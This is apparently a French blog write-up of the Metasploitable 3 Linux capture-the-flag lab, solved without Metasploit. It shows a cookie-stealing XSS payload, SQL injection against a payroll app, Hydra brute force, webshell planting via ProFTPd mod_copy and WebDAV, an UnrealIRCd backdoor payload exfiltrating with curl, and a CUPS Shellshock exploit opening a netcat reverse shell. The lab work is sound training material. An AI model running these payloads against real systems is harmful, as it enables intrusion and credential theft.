---
title: "Solution du CTF Metasploitable 3 (Linux)"
tags: [CTF]
---

### Metasploitable 3 sans Metasploit

Metasploitable 3, c'est une machine virtuelle volontairement vulnérable qui a été créée pour apprendre à utiliser Metasploit en s'amusant.

La particularité ici, c'est qu'on va voir comment exploiter les failles présentes... sans Metasploit.

Par défaut Metasploitable doit être construit par un logiciel comme Vagrant mais on peut aussi trouver une image virtuelle prête à l'emploi sur [SourceForge.net](https://sourceforge.net/projects/metasploitable3-ub1404upgraded/).

### Il y a du boulot

On lance Nmap avec les scripts NSE de recherche de vulnérabilités et comme on s'y attendait l'output est très long (je l'ai réduit pour vos beaux yeux).

```console
$ sudo nmap -sCV --script vuln -T5 -p- 192.168.1.8
Starting Nmap 7.94SVN ( https://nmap.org )
Pre-scan script results:
|_broadcast-avahi-dos: ERROR: Script execution failed (use -d to debug)
Nmap scan report for 192.168.1.8
Host is up (0.00042s latency).
Not shown: 65524 filtered tcp ports (no-response)
PORT     STATE  SERVICE     VERSION
21/tcp   open   ftp         ProFTPD 1.3.5
| vulners: 
|   cpe:/a:proftpd:proftpd:1.3.5: 
|       SAINT:FD1752E124A72FD3A26EEB9B315E8382  10.0    https://vulners.com/saint/SAINT:FD1752E124A72FD3A26EEB9B315E8382        *EXPLOIT*
|       SAINT:950EB68D408A40399926A4CCAD3CC62E  10.0    https://vulners.com/saint/SAINT:950EB68D408A40399926A4CCAD3CC62E        *EXPLOIT*
|       SAINT:63FB77B9136D48259E4F0D4CDA35E957  10.0    https://vulners.com/saint/SAINT:63FB77B9136D48259E4F0D4CDA35E957        *EXPLOIT*
|       SAINT:1B08F4664C428B180EEC9617B41D9A2C  10.0    https://vulners.com/saint/SAINT:1B08F4664C428B180EEC9617B41D9A2C        *EXPLOIT*
|       PROFTPD_MOD_COPY        10.0    https://vulners.com/canvas/PROFTPD_MOD_COPY     *EXPLOIT*
--- snip ---
|       CC3AE4FC-CF04-5EDA-A010-6D7E71538C92    5.9     https://vulners.com/githubexploit/CC3AE4FC-CF04-5EDA-A010-6D7E71538C92  *EXPLOIT*
|       54E1BB01-2C69-5AFD-A23D-9783C9D9FC4C    5.9     https://vulners.com/githubexploit/54E1BB01-2C69-5AFD-A23D-9783C9D9FC4C  *EXPLOIT*
|       CVE-2017-7418   5.5     https://vulners.com/cve/CVE-2017-7418
|       SSV:61050       5.0     https://vulners.com/seebug/SSV:61050    *EXPLOIT*
|_      CVE-2013-4359   5.0     https://vulners.com/cve/CVE-2013-4359
22/tcp   open   ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:6.6.1p1: 
|       F0979183-AE88-53B4-86CF-3AF0523F3807    9.8     https://vulners.com/githubexploit/F0979183-AE88-53B4-86CF-3AF0523F3807  *EXPLOIT*
|       CVE-2023-38408  9.8     https://vulners.com/cve/CVE-2023-38408
|       CVE-2016-1908   9.8     https://vulners.com/cve/CVE-2016-1908
|       B8190CDB-3EB9-5631-9828-8064A1575B23    9.8     https://vulners.com/githubexploit/B8190CDB-3EB9-5631-9828-8064A1575B23  *EXPLOIT*
|       8FC9C5AB-3968-5F3C-825E-E8DB5379A623    9.8     https://vulners.com/githubexploit/8FC9C5AB-3968-5F3C-825E-E8DB5379A623  *EXPLOIT*
--- snip ---
|       SSH_ENUM        5.0     https://vulners.com/canvas/SSH_ENUM     *EXPLOIT*
|       PACKETSTORM:150621      5.0     https://vulners.com/packetstorm/PACKETSTORM:150621      *EXPLOIT*
--- snip ---
|_      1337DAY-ID-25391        0.0     https://vulners.com/zdt/1337DAY-ID-25391        *EXPLOIT*
80/tcp   open   http        Apache httpd 2.4.7
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:apache:http_server:2.4.7: 
|       C94CBDE1-4CC5-5C06-9D18-23CAB216705E    10.0    https://vulners.com/githubexploit/C94CBDE1-4CC5-5C06-9D18-23CAB216705E  *EXPLOIT*
|       PACKETSTORM:181114      9.8     https://vulners.com/packetstorm/PACKETSTORM:181114      *EXPLOIT*
|       MSF:EXPLOIT-MULTI-HTTP-APACHE_NORMALIZE_PATH_RCE-       9.8     https://vulners.com/metasploit/MSF:EXPLOIT-MULTI-HTTP-APACHE_NORMALIZE_PATH_RCE-        *EXPLOIT*
|       MSF:AUXILIARY-SCANNER-HTTP-APACHE_NORMALIZE_PATH-       9.8     https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-HTTP-APACHE_NORMALIZE_PATH-        *EXPLOIT*
|       HTTPD:E8492EE5729E8FB514D3C0EE370C9BC6  9.8     https://vulners.com/httpd/HTTPD:E8492EE5729E8FB514D3C0EE370C9BC6
|       HTTPD:C072933AA965A86DA3E2C9172FFC1569  9.8     https://vulners.com/httpd/HTTPD:C072933AA965A86DA3E2C9172FFC1569
|       HTTPD:A1BBCE110E077FFBF4469D4F06DB9293  9.8     https://vulners.com/httpd/HTTPD:A1BBCE110E077FFBF4469D4F06DB9293
--- snip ---
|       PACKETSTORM:171631      7.5     https://vulners.com/packetstorm/PACKETSTORM:171631      *EXPLOIT*
|       PACKETSTORM:164941      7.5     https://vulners.com/packetstorm/PACKETSTORM:164941      *EXPLOIT*
|       PACKETSTORM:164629      7.5     https://vulners.com/packetstorm/PACKETSTORM:164629      *EXPLOIT*
|       PACKETSTORM:164609      7.5     https://vulners.com/packetstorm/PACKETSTORM:164609      *EXPLOIT*
|       MSF:AUXILIARY-SCANNER-HTTP-APACHE_OPTIONSBLEED- 7.5     https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-HTTP-APACHE_OPTIONSBLEED-  *EXPLOIT*
|       HTTPD:F1CFBC9B54DFAD0499179863D36830BB  7.5     https://vulners.com/httpd/HTTPD:F1CFBC9B54DFAD0499179863D36830BB
|       HTTPD:D5C9AD5E120B9B567832B4A5DBD97F43  7.5     https://vulners.com/httpd/HTTPD:D5C9AD5E120B9B567832B4A5DBD97F43
|       HTTPD:C317C7138B4A8BBD54A901D6DDDCB837  7.5     https://vulners.com/httpd/HTTPD:C317C7138B4A8BBD54A901D6DDDCB837
--- snip ---
|       04E3583E-DFED-5D0D-BCF2-1C1230EB666D    7.5     https://vulners.com/githubexploit/04E3583E-DFED-5D0D-BCF2-1C1230EB666D  *EXPLOIT*
|       00EC8F03-D8A3-56D4-9F8C-8DD1F5ACCA08    7.5     https://vulners.com/githubexploit/00EC8F03-D8A3-56D4-9F8C-8DD1F5ACCA08  *EXPLOIT*
|       HTTPD:D66D5F45690EBE82B48CC81EF6388EE8  7.3     https://vulners.com/httpd/HTTPD:D66D5F45690EBE82B48CC81EF6388EE8
|       CVE-2023-38709  7.3     https://vulners.com/cve/CVE-2023-38709
|_      05403438-4985-5E78-A702-784E03F724D4    0.0     https://vulners.com/githubexploit/05403438-4985-5E78-A702-784E03F724D4  *EXPLOIT*
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.1.8
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.1.8:80/chat/
|     Form id: name
|     Form action: index.php
|     
|     Path: http://192.168.1.8:80/payroll_app.php
|     Form id: 
|     Form action: 
|     
|     Path: http://192.168.1.8:80/drupal/
|     Form id: user-login-form
|_    Form action: /drupal/?q=node&destination=node
| http-sql-injection: 
|   Possible sqli for queries:
|     http://192.168.1.8:80/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.1.8:80/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.1.8:80/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.1.8:80/?C=N%3BO%3DD%27%20OR%20sqlspider
|     http://192.168.1.8:80/?C=D%3BO%3DD%27%20OR%20sqlspider
|     http://192.168.1.8:80/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.1.8:80/?C=M%3BO%3DA%27%20OR%20sqlspider
|_    http://192.168.1.8:80/?C=S%3BO%3DA%27%20OR%20sqlspider
| http-fileupload-exploiter: 
|   
|_    Couldn't find a file-type field.
| http-dombased-xss: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.1.8
|   Found the following indications of potential DOM based XSS: 
|     
|     Source: eval("document.location.href = '"+b+"pos="+a.options[a.selectedIndex].value+"'")
|_    Pages: http://192.168.1.8:80/phpmyadmin/js/functions.js?ts=1365422810
| http-enum: 
|   /: Root directory w/ listing on 'apache/2.4.7 (ubuntu)'
|   /phpmyadmin/: phpMyAdmin
|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.7 (ubuntu)'
445/tcp  open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
631/tcp  open   ipp         CUPS 1.7
| http-enum: 
|   /admin.php: Possible admin folder
|   /admin/: Possible admin folder
|   /admin/admin/: Possible admin folder
|   /administrator/: Possible admin folder
|   /admin_area/admin.aspx: Possible admin folder
--- snip ---
|   /admin/jscript/upload.asp: Lizard Cart/Remote File upload
|   /admin/environment.xml: Moodle files
|   /classes/: Potentially interesting folder
|   /es/: Potentially interesting folder
|   /helpdesk/: Potentially interesting folder
|   /help/: Potentially interesting folder
|_  /printers/: Potentially interesting folder
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
| vulners: 
|   cpe:/a:apple:cups:1.7: 
|       CVE-2014-5031   5.0     https://vulners.com/cve/CVE-2014-5031
|       CVE-2014-2856   4.3     https://vulners.com/cve/CVE-2014-2856
|       CVE-2014-5030   1.9     https://vulners.com/cve/CVE-2014-5030
|       CVE-2014-3537   1.2     https://vulners.com/cve/CVE-2014-3537
|_      CVE-2013-6891   1.2     https://vulners.com/cve/CVE-2013-6891
|_http-server-header: CUPS/1.7 IPP/2.1
3000/tcp closed ppp
3306/tcp open   mysql       MySQL (unauthorized)
3500/tcp open   http        WEBrick httpd 1.3.1 (Ruby 2.3.8 (2018-10-18))
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| vulners: 
|   cpe:/a:ruby-lang:ruby:2.3.8: 
|       CVE-2017-9225   9.8     https://vulners.com/cve/CVE-2017-9225
|       CVE-2022-28739  7.5     https://vulners.com/cve/CVE-2022-28739
|       CVE-2021-41819  7.5     https://vulners.com/cve/CVE-2021-41819
|       CVE-2021-28966  7.5     https://vulners.com/cve/CVE-2021-28966
|       CVE-2021-28965  7.5     https://vulners.com/cve/CVE-2021-28965
|       CVE-2020-25613  7.5     https://vulners.com/cve/CVE-2020-25613
|       CVE-2017-9229   7.5     https://vulners.com/cve/CVE-2017-9229
|       CVE-2015-9096   6.1     https://vulners.com/cve/CVE-2015-9096
|       CVE-2021-31810  5.8     https://vulners.com/cve/CVE-2021-31810
|_      CVE-2023-28756  5.3     https://vulners.com/cve/CVE-2023-28756
| http-enum: 
|   /robots.txt: Robots file
|_  /readme.html: Interesting, a readme.
|_http-server-header: WEBrick/1.3.1 (Ruby/2.3.8/2018-10-18)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
6697/tcp open   irc         UnrealIRCd
|_irc-botnet-channels: ERROR: Script execution failed (use -d to debug)
|_ssl-ccs-injection: No reply from server (TIMEOUT)
8080/tcp open   http        Jetty 8.1.7.v20120910
|_http-server-header: Jetty(8.1.7.v20120910)
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.1.8
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.1.8:8080/continuum/security/login.action;jsessionid=vb0f11ynjfyjwon5bgo7nd96
|     Form id: loginform
|     Form action: /continuum/security/login_submit.action;jsessionid=cswooozwgqf31vuz7oxjxhqg1
--- snip ---
|     Path: http://192.168.1.8:8080/continuum/security/register_submit.action;jsessionid=cswooozwgqf31vuz7oxjxhqg1
|     Form id: registerform
|_    Form action: /continuum/security/register_submit.action;jsessionid=cswooozwgqf31vuz7oxjxhqg1
8181/tcp closed intermapper
MAC Address: 08:00:27:59:28:2D (Oracle VirtualBox virtual NIC)
Service Info: Hosts: 127.0.0.1, METASPLOITABLE3-UB1404, irc.TestIRC.net; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb-vuln-ms10-061: false
|_smb-vuln-ms10-054: false
| smb-vuln-regsvc-dos: 
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_ 
```

### Chatbot

Sur le port 80 on trouve un listing Apache. Ce listing n'est sans doute pas vraiment généré dynamiquement, car comme on le verra plus tard, il y a aussi un dossier `uploads` existant qui n'apparaît pas ici.

Parmi les éléments visibles on a le `chat`, `drupal`, `phpmyadmin`, `payroll`, etc.

Je passe rapidement sur le chat, car il a crashé et repose sur trop de guessing.

Wapiti a tout de même détecté qu'il y avait un stored XSS.

```
---
Stored Cross Site Scripting in http://192.168.1.8/chat/read_log.php?_=1749124338384 via injection in the parameter text
Evil request:
    POST /chat/post.php HTTP/1.1
    host: 192.168.1.8
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    content-type: application/x-www-form-urlencoded
    referer: http://192.168.1.8/chat/index.php
    cookie: name=devloop; PHPSESSID=d43744d324d2b9b8f8ae8d60d9a61c79
    content-length: 59
    Content-Type: application/x-www-form-urlencoded

    text=%3CScRiPt%3Ealert%28%27wczzog0kuf%27%29%3C%2FsCrIpT%3E
---
```

J'ai ainsi posté ce code JS dans le chat pour essayer d'obtenir le cookie du chatbot :

```js
<script>var img = document.createElement("img"); img.src = "http://192.168.1.43:8000/?" + encodeURI(document.cookie); document.body.appendChild(img);</script>
```

Mais à ce stade le chatbox avait dû crasher, il ne répondait plus. Je ne recevais que mon propre cookie sur mon serveur.

Une solution est présente sur Youtube : [Exploit the Chat Bot on Metasploitable3](https://www.youtube.com/watch?v=ZS0-sKd6Vcc)

### Payroll App

On tombe face à face avec une mire de connexion. Si on joue un peu avec (les classiques injections `" or "1"="1`) on se rend compte que l'on peut bypasser le login.

La zone authentifiée n'a toutefois aucune valeur. On va donc extraire les données avec sqlmap :

```bash
sqlmap -u http://192.168.1.8/payroll_app.php --data "user=toto&password=toto&s=OK"
```

```
sqlmap identified the following injection point(s) with a total of 58 HTTP(s) requests:
---
Parameter: user (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=toto' AND (SELECT 8765 FROM (SELECT(SLEEP(5)))bLEs) AND 'PQLD'='PQLD&password=toto&s=OK

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: user=toto' UNION ALL SELECT NULL,NULL,CONCAT(0x716a717a71,0x7866557676416a7851486f50686d635748564d556b4f57756a6453786b57785470794d6248644545,0x717a767a71),NULL-- -&password=toto&s=OK
---
```

sqlmap valide la possibilité d'extraire les données avec `UNION`. Avec l'option `--db` je liste les bases existantes :

```
available databases [5]:
[*] drupal
[*] information_schema
[*] mysql
[*] payroll
[*] performance_schema
```

Et dans la base `payroll` se trouve une table avec des identifiants :

```
Database: payroll
Table: users
[15 entries]
+--------+-------------------------+------------------+------------+------------+
| salary | password                | username         | last_name  | first_name |
+--------+-------------------------+------------------+------------+------------+
| 9560   | help_me_obiwan          | leia_organa      | Organa     | Leia       |
| 1080   | like_my_father_beforeme | luke_skywalker   | Skywalker  | Luke       |
| 1200   | nerf_herder             | han_solo         | Solo       | Han        |
| 22222  | b00p_b33p               | artoo_detoo      | Detoo      | Artoo      |
| 3200   | Pr0t0c07                | c_three_pio      | Threepio   | C          |
| 10000  | thats_no_m00n           | ben_kenobi       | Kenobi     | Ben        |
| 6666   | Dark_syD3               | darth_vader      | Vader      | Darth      |
| 1025   | but_master:(            | anakin_skywalker | Skywalker  | Anakin     |
| 2048   | mesah_p@ssw0rd          | jarjar_binks     | Binks      | Jar-Jar    |
| 40000  | @dm1n1str8r             | lando_calrissian | Calrissian | Lando      |
| 20000  | mandalorian1            | boba_fett        | Fett       | Boba       |
| 65000  | my_kinda_skum           | jabba_hutt       | Hutt       | Jaba       |
| 50000  | hanSh0tF1rst            | greedo           | Rodian     | Greedo     |
| 4500   | rwaaaaawr8              | chewbacca        | <blank>    | Chewbacca  |
| 6667   | Daddy_Issues2           | kylo_ren         | Ren        | Kylo       |
+--------+-------------------------+------------------+------------+------------+
```

Avec Hydra, je découvre que ces identifiants sont valides, sur FTP comme sur SSH :

```console
$ hydra -L users.txt -P pass.txt ftp://192.168.1.8
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[DATA] max 16 tasks per 1 server, overall 16 tasks, 289 login tries (l:17/p:17), ~19 tries per task
[DATA] attacking ftp://192.168.1.8:21/
[21][ftp] host: 192.168.1.8   login: leia_organa   password: help_me_obiwan
[21][ftp] host: 192.168.1.8   login: luke_skywalker   password: like_my_father_beforeme
[21][ftp] host: 192.168.1.8   login: han_solo   password: nerf_herder
[21][ftp] host: 192.168.1.8   login: artoo_detoo   password: b00p_b33p
[21][ftp] host: 192.168.1.8   login: c_three_pio   password: Pr0t0c07
[21][ftp] host: 192.168.1.8   login: ben_kenobi   password: thats_no_m00n
[21][ftp] host: 192.168.1.8   login: anakin_skywalker   password: but_master:(
[21][ftp] host: 192.168.1.8   login: jarjar_binks   password: mesah_p@ssw0rd
[21][ftp] host: 192.168.1.8   login: lando_calrissian   password: @dm1n1str8r
[21][ftp] host: 192.168.1.8   login: boba_fett   password: mandalorian1
[21][ftp] host: 192.168.1.8   login: jabba_hutt   password: my_kinda_skum
[21][ftp] host: 192.168.1.8   login: greedo   password: hanSh0tF1rst
[21][ftp] host: 192.168.1.8   login: chewbacca   password: rwaaaaawr8
[21][ftp] host: 192.168.1.8   login: kylo_ren   password: Daddy_Issues2
1 of 1 target successfully completed, 14 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished
```

Le compte Leia est privilégié (permissions sudo permettant de tout faire) :

```console
$ ssh leia_organa@192.168.1.8
The authenticity of host '192.168.1.8 (192.168.1.8)' can't be established.
ED25519 key fingerprint is SHA256:Rpy8shmBT8uIqZeMsZCG6N5gHXDNSWQ0tEgSgF7t/SM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.1.8' (ED25519) to the list of known hosts.
leia_organa@192.168.1.8's password: 
Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 3.13.0-170-generic x86_64)

 * Documentation:  https://help.ubuntu.com/
*leia_organa@metasploitable3-ub1404:~$ ls
leia_organa@metasploitable3-ub1404:~$ sudo -l
[sudo] password for leia_organa: 
Matching Defaults entries for leia_organa on metasploitable3-ub1404:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User leia_organa may run the following commands on metasploitable3-ub1404:
    (ALL : ALL) ALL
```

C'est dommage que ce soit aussi simple, surtout pour un système destiné à apprendre Metasploit. On aurait aimé faire un peu d'escalade de privilèges et de pivoting :)

### ProFTPd

Le serveur FTP est vulnérable à la faille `mod_copy`. Une vulnérabilité déjà croisée sur le [CTF Symfonos #2 de VulnHub]({% link _posts/2023-02-20-Solution-du-CTF-Symfonos-2-de-VulnHub.md %}).

Il y a un exploit Python sur exploit-db : [ProFTPd 1.3.5 - mod_copy Remote Command Execution (2) - Linux remote Exploit](https://www.exploit-db.com/exploits/49908)

Cet exploit tente d'écrire un webshell sous la racine web. Pour cela, il génère volontairement une erreur sur le serveur en faisant copier un nom de fichier correspondant à du code PHP puis essaye de copier le fichier d'erreurs (via un descripteur de fichier dans `/proc/self/fd`) vers un fichier `test.php`.

```console
$ python exploit.py 192.168.1.8
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [192.168.1.8]

350 File or directory exists, ready for destination name

550 cpto: Permission denied

350 File or directory exists, ready for destination name

250 Copy successful

Exploit Completed
[+] File Written Successfully
[+] Go to : http://192.168.1.8/test.php
```

Mais le fichier obtenu correspondait à `/etc/services`. J'ai essayé différents numéros de file descriptors mais aucun n'a fonctionné.

Une solution possible consiste à d'abord utiliser un accès FTP pour mettre un webshell sur le système :

```console
$ ftp 192.168.1.8
Connected to 192.168.1.8.
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [192.168.1.8]
Name (192.168.1.8:nico): leia_organa
331 Password required for leia_organa
Password: 
230 User leia_organa logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
200 EPRT command successful
150 Opening ASCII mode data connection for file list
226 Transfer complete
ftp> pwd
Remote directory: /home/leia_organa
ftp> put shell.php*
local: shell.php remote: shell.php
200 EPRT command successful
150 Opening BINARY mode data connection for shell.php
100% |************************************************************************************************************************************************************************************************|    31      720.79 KiB/s    00:00 ETA
226 Transfer complete
31 bytes sent in 00:00 (58.44 KiB/s)
```

On change ensuite l'exploit FTP pour qu'il copie le webshell depuis le dossier de Leia vers la racine web :

```python
def exploit(client, target):
    client.connect((target,21)) # Connecting to the target server
    banner = client.recv(74)
    print(banner.decode())
    client.send(b'site cpfr /home/leia_organa/shell.php\r\n')
    print(client.recv(1024).decode())
    client.send(b'site cpto /var/www/html/test.php\r\n')
    print(client.recv(1024).decode())
    client.close()
    print('Exploit Completed')
```

On obtiendra alors un shell en tant que `ww-data`.

### Samba

Rien trouvé du côté de Samba. On peut lister les shares mais on ne peut pas y accéder même avec les identifiants.

```console
$ smbclient -U "" -N -L //192.168.1.8

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        public          Disk      WWW
        IPC$            IPC       IPC Service (metasploitable3-ub1404 server (Samba, Ubuntu))
        canonts5300series Printer   Canon TS5300 with driver Canon TS5300 series Ver.5.90 @ linux-v
SMB1 disabled -- no workgroup available
```

### WebDAV

Les scripts Nmap ont trouvé un dossier `uploads` sur le port 80 malgré son absence dans le listing Apache.

Vu le nom du fichier, on va lister les méthodes autorisées :

```console
$ curl -XOPTIONS -D- http://192.168.1.8/uploads/
HTTP/1.1 200 OK
Date: Thu, 05 Jun 2025 13:39:39 GMT
Server: Apache/2.4.7 (Ubuntu)
DAV: 1,2
DAV: <http://apache.org/dav/propset/fs/1>
MS-Author-Via: DAV
Allow: OPTIONS,GET,HEAD,POST,DELETE,TRACE,PROPFIND,PROPPATCH,COPY,MOVE,LOCK,UNLOCK
Content-Length: 0
Content-Type: httpd/unix-directory
```

Bien vu ! Le serveur indique que les méthodes DAV sont autorisées sur ce dossier. On peut uploader un shell avec cadaver :

```console
cadaver http://192.168.1.8/uploads/
dav:/uploads/> put shell.php
Uploading shell.php to `/uploads/shell.php':
Progress: [=============================>] 100.0% of 31 bytes succeeded.
```

### UnreadIRCd

Comme pour `mod_copy`, cette version du logiciel est un classique des CTFs. Une backdoor y est présente et permet l'exécution de commandes.

Il existe un vieil exploit en Perl : [UnrealIRCd 3.2.8.1 - Remote Downloader/Execute - Linux remote Exploit](https://www.exploit-db.com/exploits/13853)

Pour tester, j'ai édité l'exploit et ajouté un payload qui exfiltre l'uid utilisé par le service :

```perl
my $payload6 = 'AB; curl http://192.168.1.47/`id`';
```

Et on obtient `uid=1121(boba_fett)`.

### Continuum (port 8080)

Comme on s'en doute, les services vulnérables ici ont tous leur équivalent sous la forme de modules Metasploit.

Voici celui pour Continuum : [Apache Continuum - Arbitrary Command Execution (Metasploit) - Linux remote Exploit](https://www.exploit-db.com/exploits/39945)

Comme on veut faire sans Metasploit, il va falloir réimplémenter ce qui est fait. Ici l'exploit est très simple, il suffit de soumettre une requête HTTP POST avec 3 paramètres :

```bash
curl http://192.168.1.8:8080/continuum/saveInstallation.action -X POST --data 'installation.name=idontgiveafuck&installation.type=jdk&installation.varValue=`touch /tmp/pwned`'
```

### Drupal

Le CMS est vulnérable à la populaire faille Drupalgeddon. Le module Metasploit a l'avantage de donner directement un shell, mais les autres exploits présents sur exploit-db ne font que des actions sur la base SQL.

Celui çi permet de créer un compte administrateur : [Drupal 7.0 < 7.31 - Drupalgeddon SQL Injection (Add Admin User) - PHP webapps Exploit](https://www.exploit-db.com/exploits/34992)

```console
$ python drupal.py -t http://192.168.1.8/drupal/ -u toto -p toto
/tmp/drupal.py:147: SyntaxWarning: invalid escape sequence '\ '
  banner = """

  ______                          __     _______  _______ _____    
 |   _  \ .----.--.--.-----.---.-|  |   |   _   ||   _   | _   |   
 |.  |   \|   _|  |  |  _  |  _  |  |   |___|   _|___|   |.|   |   
 |.  |    |__| |_____|   __|___._|__|      /   |___(__   `-|.  |   
 |:  1    /          |__|                 |   |  |:  1   | |:  |   
 |::.. . /                                |   |  |::.. . | |::.|   
 `------'                                 `---'  `-------' `---'   
  _______       __     ___       __            __   __             
 |   _   .-----|  |   |   .-----|__.-----.----|  |_|__.-----.-----.
 |   1___|  _  |  |   |.  |     |  |  -__|  __|   _|  |  _  |     |
 |____   |__   |__|   |.  |__|__|  |_____|____|____|__|_____|__|__|
 |:  1   |  |__|      |:  |    |___|                               
 |::.. . |            |::.|                                        
 `-------'            `---'                                        

                                 Drup4l => 7.0 <= 7.31 Sql-1nj3ct10n
                                              Admin 4cc0unt cr3at0r

                          Discovered by:

                          Stefan  Horst
                         (CVE-2014-3704)

                           Written by:

                         Claudio Viviani

                      http://www.homelab.it

                         info@homelab.it
                     homelabit@protonmail.ch

                 https://www.facebook.com/homelabit
                   https://twitter.com/homelabit
                 https://plus.google.com/+HomelabIt1/
       https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww


[!] VULNERABLE!

[!] Administrator user created!

[*] Login: toto
[*] Pass: toto
[*] Url: http://192.168.1.8/drupal//?q=node&destination=node
```

Une fois le compte créé, on peut jouer avec les paramètres de l'appli pour obtenir une exécution de code.

La méthode est décrite ici : [Solution du CTF DC: 1 de VulnHub]({% link _posts/2023-03-20-Solution-du-CTF-DC-1-de-VulnHub.md %})

### CUPS

CUPS est la grosse déception de ce CTF. En théorie, il est vulnérable à Shellshock mais un défaut de configuration ou de dépendances fait que l'exploitation n'est pas possible :

[CUPS service in metasploitable3 linux not exploitable due to configuration issue · Issue #459 · rapid7/metasploitable3 · GitHub](https://github.com/rapid7/metasploitable3/issues/459)

Pour ne pas rester frustré, je suis parvenu à créer [une image docker d'un CUPS vulnérable](https://github.com/devl00p/vulnerable_cups_shellshock_docker_image) (non sans mal) et à [réécrire le module Metasploit en Python](https://github.com/devl00p/exploits/blob/main/devloop-cups-shellshock.py) (à l'aide de Gemini).

```console
$ python cups.py -v -U admin -P hello -c "nc -e /bin/bash 192.168.1.43 9999" -p 6311 127.0.0.1
[*] Attempting to exploit CVE-2014-6271 on http://127.0.0.1:6311
[*] Checking CUPS and credentials...
[*] (VERBOSE) Adding new printer 'YV9B9w0rQcao' with payload in PRINTER_LOCATION
[*] (VERBOSE) Sending POST request to http://127.0.0.1:6311/admin/
[*] (VERBOSE) POST Data: {'org.cups.sid': 'QxsG081GaJjCy9O9', 'OP': 'add-printer', 'PRINTER_NAME': 'YV9B9w0rQcao', 'PRINTER_INFO': '', 'PRINTER_LOCATION': 'Checking...', 'DEVICE_URI': 'file:///dev/null'}
[*] (VERBOSE) Files: ['PPD_FILE']
[*] (VERBOSE) Response Status: 200
[*] (VERBOSE) Response Headers: {'Date': 'Fri, 06 Jun 2025 07:38:48 GMT', 'Server': 'CUPS/1.5', 'Connection': 'Keep-Alive', 'Keep-Alive': 'timeout=30', 'Content-Language': 'en_US', 'Transfer-Encoding': 'chunked', 'Content-Type': 'text/html;charset=utf-8'}
[*] Found CUPS server: CUPS/1.5
[+] Successfully added dummy printer 'YV9B9w0rQcao' for check.
[*] (VERBOSE) Deleting printer 'YV9B9w0rQcao'
[*] (VERBOSE) Sending POST request to http://127.0.0.1:6311/admin/
[*] (VERBOSE) POST Data: {'org.cups.sid': 'QxsG081GaJjCy9O9', 'OP': 'delete-printer', 'printer_name': 'YV9B9w0rQcao', 'confirm': 'Delete Printer'}
[*] (VERBOSE) Response Status: 200
[*] (VERBOSE) Response Headers: {'Date': 'Fri, 06 Jun 2025 07:38:48 GMT', 'Server': 'CUPS/1.5', 'Connection': 'Keep-Alive', 'Keep-Alive': 'timeout=30', 'Content-Language': 'en_US', 'Transfer-Encoding': 'chunked', 'Content-Type': 'text/html;charset=utf-8'}
[+] Successfully deleted dummy printer 'YV9B9w0rQcao'.
[*] Adding printer 'pwned-ybsOG8NX' with payload...
[*] (VERBOSE) Adding new printer 'pwned-ybsOG8NX' with payload in PRINTER_LOCATION
